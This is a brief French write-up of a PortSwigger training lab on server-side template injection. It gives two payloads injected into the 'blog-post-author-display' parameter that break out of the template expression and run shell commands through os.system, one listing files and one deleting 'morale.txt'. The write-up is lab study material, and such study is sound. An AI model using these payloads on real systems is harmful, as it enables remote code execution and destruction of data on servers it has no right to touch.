# Lab

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

## Payload

Sur la page de profil, on peut choisir quelle information on affiche quand on poste un commentaire.

Par défaut, on affiche le nom de l'utilisateur qui a posté le commentaire.

Une requete est envoyée avec `blog-post-author-display=user.name`

On peut changer la valeur de `blog-post-author-display` pour afficher autre chose.

`blog-post-author-display='r'}}{% import os %}{{os.system('ls -al')`

`blog-post-author-display='r'}}{% import os %}{{os.system('rm morale.txt')`